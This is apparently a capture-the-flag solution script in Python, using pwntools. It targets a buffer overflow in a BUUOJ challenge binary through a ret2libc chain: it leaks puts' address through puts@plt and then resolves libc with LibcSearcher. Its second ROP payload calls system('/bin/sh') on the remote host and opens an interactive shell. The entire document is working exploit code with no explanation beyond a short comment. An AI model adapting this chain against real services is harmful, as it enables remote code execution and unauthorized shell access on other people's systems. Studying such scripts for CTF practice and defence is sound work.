# 溢出控制返回地址，使用puts@plt来打印puts实际地址，然后libc search?

from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'

elf = ELF("./pwn")
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x400c83  
main_addr = 0x400b28
p = remote("node3.buuoj.cn", 28224)

p.sendline('1')

payload1 = b'\x00' + b'a'*(0x4f + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("encrypted\n", payload1)

p.recvuntil("Ciphertext\n\n")
puts_addr = u64(p.recvuntil("\n", drop=True).ljust(8, b'\x00'))
# print(hex(puts_addr), type(puts_addr))

libc = LibcSearcher("puts", puts_addr)
offset = puts_addr - libc.dump("puts")

# after we found the corresponding libc, we can use system and the string "/bin/sh"
system_addr = libc.dump("system") + offset
binsh = libc.dump("str_bin_sh") + offset

# use ROPgadget
ret_addr = 0x4006b9

payload2 = b'\x00' + b'a'*(0x50-1+8) + p64(ret_addr) + p64(pop_rdi) + p64(binsh) + p64(system_addr)

p.sendline('1')

p.sendlineafter("encrypted\n", payload2)

p.interactive()

